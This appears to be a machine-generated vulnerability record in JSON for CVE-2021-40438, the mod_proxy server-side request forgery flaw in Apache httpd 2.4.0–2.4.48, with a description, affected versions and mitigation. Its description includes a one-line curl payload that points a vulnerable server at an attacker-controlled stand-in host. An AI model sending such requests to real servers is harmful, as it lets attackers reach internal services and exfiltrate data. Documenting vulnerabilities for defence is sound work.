{
    "desc": "CVE-2021-40438 is a critical server\u2011side request forgery vulnerability in the Apache HTTP Server. The flaw resides in the mod_proxy module of Apache HTTP Server versions 2.4.0 through 2.4.48 (inclusive). When mod_proxy is enabled, the module parses the entire request URI for the string \u201cunix:\u201d. An attacker can embed a specially crafted URI\u2011path that contains a pipe (|) followed by an arbitrary target URL. Because the parsing logic does not restrict the match to the beginning of the string, the crafted path causes mod_proxy to treat the attacker\u2011controlled URL as the destination for the proxied request. As a result, the vulnerable Apache front\u2011end forwards the request to any server the attacker chooses, enabling request smuggling, spoofing of source IP addresses, data exfiltration from internal services, and denial\u2011of\u2011service attacks against the chosen target. The vulnerability can be exploited remotely without authentication by sending a single HTTP request such as:\n\n    curl \"http://vulnerable.example/?unix:AAAA...|http://attacker-controlled.example\"\n\nNo additional services or components are required to trigger the vulnerability; the presence of a vulnerable Apache HTTP Server with mod_proxy enabled is sufficient. Mitigation requires upgrading to Apache HTTP Server version 2.4.49 or later, or disabling the mod_proxy module entirely.",
    "attack_type": "Server Side Request Forgery",
    "services": [
        {
            "name": "httpd",
            "version": [
                "2.4.0",
                "2.4.1",
                "2.4.2",
                "2.4.3",
                "2.4.4",
                "2.4.5",
                "2.4.6",
                "2.4.7",
                "2.4.8",
                "2.4.9",
                "2.4.10",
                "2.4.11",
                "2.4.12",
                "2.4.13",
                "2.4.14",
                "2.4.15",
                "2.4.16",
                "2.4.17",
                "2.4.18",
                "2.4.19",
                "2.4.20",
                "2.4.21",
                "2.4.22",
                "2.4.23",
                "2.4.24",
                "2.4.25",
                "2.4.26",
                "2.4.27",
                "2.4.28",
                "2.4.29",
                "2.4.30",
                "2.4.31",
                "2.4.32",
                "2.4.33",
                "2.4.34",
                "2.4.35",
                "2.4.36",
                "2.4.37",
                "2.4.38",
                "2.4.39",
                "2.4.40",
                "2.4.41",
                "2.4.42",
                "2.4.43",
                "2.4.44",
                "2.4.45",
                "2.4.46",
                "2.4.47",
                "2.4.48"
            ],
            "dependency_type": "HARD",
            "description": "Apache HTTP Server with the mod_proxy module enabled; this is the vulnerable component whose flawed URI parsing enables the server\u2011side request forgery."
        }
    ],
    "input_tokens": 6315,
    "output_tokens": 1779
}